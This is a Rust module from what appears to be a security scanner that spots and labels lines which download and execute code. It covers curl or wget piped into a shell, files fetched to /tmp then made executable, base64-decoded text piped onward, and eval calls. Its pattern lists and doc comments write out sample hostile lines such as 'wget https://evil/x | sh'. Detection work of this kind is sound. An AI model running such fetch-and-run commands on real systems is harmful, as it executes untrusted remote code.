//! What a line fetches, and what it does with it once it has.
//!
//! Split out of `content.rs` to stay under the file's line cap. Everything
//! here answers one question — which command on this line actually runs
//! what it downloaded, and how to name it — because a sentence that names
//! the wrong one gives two different payloads one identity, and one
//! dismissal then settles the one nobody saw.

use super::super::Line;

/// What this line does, and what it does it to — so two lines that reach
/// for two different things are two questions. A finding's identity is its
/// rule and its sentence, and a sentence that says only "this line" is the
/// same sentence wherever it fires: the person is shown one and settles
/// both.
///
/// Named from the line, never from the file it sits in: a file is something
/// kendex's own rendering moves between (an over-cap body is split into
/// `references/`), and an identity that moved with it would stop being the
/// finding a decision was made about.
pub(super) struct Reach {
    what: &'static str,
    /// How the operand attaches to `what` — "from", "with", "out of",
    /// "built from".
    preposition: &'static str,
    operand: String,
}

impl Reach {
    pub(super) fn said(&self) -> String {
        if self.operand.is_empty() {
            return self.what.to_owned();
        }
        const CAP: usize = 60;
        let shown = crate::quality::redact(&self.operand);
        // An `eval` argument is a whole program on one line, and a message
        // is a sentence. What is cut is named by a digest of the whole, so
        // two long operands sharing a prefix stay two questions.
        let shown = match shown.char_indices().nth(CAP) {
            None => shown,
            Some((at, _)) => format!("{}… {}", &shown[..at], crate::quality::digest(&shown)),
        };
        format!("{} {} `{shown}`", self.what, self.preposition)
    }
}

/// Places where a line hands something to an interpreter.
const SHELLS: &[&str] = &["| sh", "|sh", "| bash", "|bash", "| zsh", "| python"];

/// The same, for a file that was downloaded first and run afterwards.
const THEN_RUNS: &[&str] = &["&& sh", "&& bash", "chmod +x"];

/// A plain description of what this line fetches and runs, if it does.
pub(super) fn fetch_and_run(line: &Line) -> Option<Reach> {
    let verbs = fetch_verbs(line);
    if !verbs.is_empty() {
        let piped = marks(line, SHELLS);
        let run = match piped.is_empty() {
            false => Some(("pipes a download straight into a shell", piped)),
            true => {
                let then = marks(line, THEN_RUNS);
                (line.has("/tmp/") && !then.is_empty())
                    .then_some(("downloads a file and then executes it", then))
            }
        };
        if let Some((what, run)) = run {
            let (preposition, operand) = downloads(line, &verbs, &run);
            return Some(Reach {
                what,
                preposition,
                operand,
            });
        }
    }
    if line.has("base64") && line.has("|") && (line.has("-d") || line.has("--decode")) {
        return Some(Reach {
            what: "decodes hidden text and pipes it onward",
            preposition: "out of",
            // Where an encoded payload is written, whether it is piped in
            // or passed on the decoding command itself.
            operand: line
                .text
                .split('|')
                .next()
                .unwrap_or(&line.text)
                .trim()
                .to_owned(),
        });
    }
    line.find("eval(").map(|at| Reach {
        what: "hands a built-up string to an interpreter",
        preposition: "built from",
        // Everything after the parenthesis, not the text up to the first
        // `)`: an argument that calls something closes a bracket of its
        // own, so cutting there gives `eval(f(x) + a)` and `eval(f(x) + b)`
        // one sentence and one decision. Over-including never merges two
        // different programs; cutting early does.
        operand: line.text[at + "eval(".len()..].trim().to_owned(),
    })
}

/// Every fetch verb on this line, as the offset just past it, in the order
/// they are written.
///
/// In the order they are written, never the order the verbs are listed in:
/// `curl …; wget … | sh` and `wget … | sh; curl …` are the same two
/// commands, and reading them by the table's order names whichever verb the
/// table happens to put first — which on the first of those is the one that
/// does not run.
fn fetch_verbs(line: &Line) -> Vec<std::ops::Range<usize>> {
    let mut found: Vec<std::ops::Range<usize>> = ["curl", "wget"]
        .iter()
        .flat_map(|verb| {
            line.occurrences(verb)
                .into_iter()
                .map(move |at| at..at + verb.len())
        })
        .collect();
    found.sort_unstable_by_key(|verb| verb.start);
    found
}

/// Whether this match is the line calling the program rather than the same
/// letters turning up inside something else. `curl` in `a.curl.se/x` is
/// part of an address, and reading it as the command names the tail of that
/// address — which every host under one domain shares.
///
/// Only which verb is *named* narrows here. What the rule fires on does
/// not: a line where nothing looks like a command is still named by every
/// match on it, because the rule fired on their presence and answering with
/// silence would give every such line one sentence.
fn starts_a_command(line: &Line, verb: &std::ops::Range<usize>) -> bool {
    line.before(verb.start)
        .is_none_or(|c| !c.is_alphanumeric() && !matches!(c, '.' | '-' | '_' | '/'))
        && line
            .after(verb.start, verb.len())
            .is_none_or(char::is_whitespace)
}

/// Every place on this line where one of `these` sits.
fn marks(line: &Line, these: &[&str]) -> Vec<usize> {
    let mut found: Vec<usize> = these
        .iter()
        .flat_map(|mark| line.occurrences(mark))
        .collect();
    found.sort_unstable();
    found
}

/// What this line downloads and then runs, named.
///
/// For each place it runs something, the fetch that reaches that operator
/// is the last one written before it — not the first fetch on the line,
/// which on `curl https://safe/a; wget https://evil/x | sh` is the one that
/// never executes. Naming that one gives every line sharing its address one
/// sentence and one decision, whatever each of them actually runs.
///
/// A line whose fetches all come after everything it runs is still named by
/// what it fetches: the rule fired on it either way, and saying nothing
/// would be the same sentence for every such line.
fn downloads(
    line: &Line,
    verbs: &[std::ops::Range<usize>],
    run: &[usize],
) -> (&'static str, String) {
    let commands: Vec<usize> = verbs
        .iter()
        .filter(|verb| starts_a_command(line, verb))
        .map(|verb| verb.end)
        .collect();
    let written: Vec<usize> = match commands.is_empty() {
        true => verbs.iter().map(|verb| verb.end).collect(),
        false => commands,
    };
    let mut feeding: Vec<usize> = run
        .iter()
        .filter_map(|at| written.iter().rev().find(|after| *after < at).copied())
        .collect();
    feeding.dedup();
    if feeding.is_empty() {
        feeding = written;
    }
    let named: Vec<(&'static str, String)> =
        feeding.iter().map(|after| fetched(line, *after)).collect();
    let preposition = match named.iter().all(|(said, _)| *said == "from") {
        true => "from",
        false => "with",
    };
    let targets: Vec<String> = named.into_iter().map(|(_, target)| target).collect();
    (preposition, targets.join(", "))
}

/// What a fetch verb is pointed at, and how to say it: the address it
/// names, or — where the address is not written out — its whole argument
/// list.
///
/// Both are read from this command's own arguments and never from the rest
/// of the line. `echo https://docs; curl https://evil/a | sh` downloads the
/// second address, and naming the first would give two lines running two
/// different payloads one sentence, and therefore one decision.
///
/// The whole argument list, because which token is the operand depends on
/// the arity of every option before it — `curl -o /tmp/payload "$URL"`
/// hands `-o` a value, and picking the first non-switch token calls the
/// output path the download. Keeping the list is what makes two fetches
/// that differ anywhere in it two questions.
///
/// The address is located in the flattened line and cut from the original,
/// so `CURL HTTPS://…` is the match the detector already made — which reads
/// the flattened text — and still prints the way it was written.
fn fetched(line: &Line, after: usize) -> (&'static str, String) {
    const BOUNDARY: &[char] = &['"', '\'', '`', ' ', '\t', ')', '(', '<', '>', ';', ','];
    let args = arguments(line, after);
    for scheme in ["https://", "http://"] {
        let Some(at) = line.lower[args.clone()].find(scheme) else {
            continue;
        };
        let rest = &line.text[args.start + at..args.end];
        let url = rest.split(BOUNDARY).next().unwrap_or(rest);
        if url.len() > scheme.len() {
            return ("from", url.to_owned());
        }
    }
    let spelled = line.text[args]
        .split_whitespace()
        .collect::<Vec<&str>>()
        .join(" ");
    ("with", spelled)
}

/// Where this fetch command's own arguments end: at the first `|`, `&&` or
/// `;` that begins the next command, or at the end of the line. Without the
/// separator the arguments of a command run afterwards read as this one's.
fn arguments(line: &Line, after: usize) -> std::ops::Range<usize> {
    let rest = &line.lower[after..];
    let end = ["|", "&&", ";"]
        .iter()
        .filter_map(|separator| rest.find(separator))
        .min()
        .unwrap_or(rest.len());
    after..after + end
}
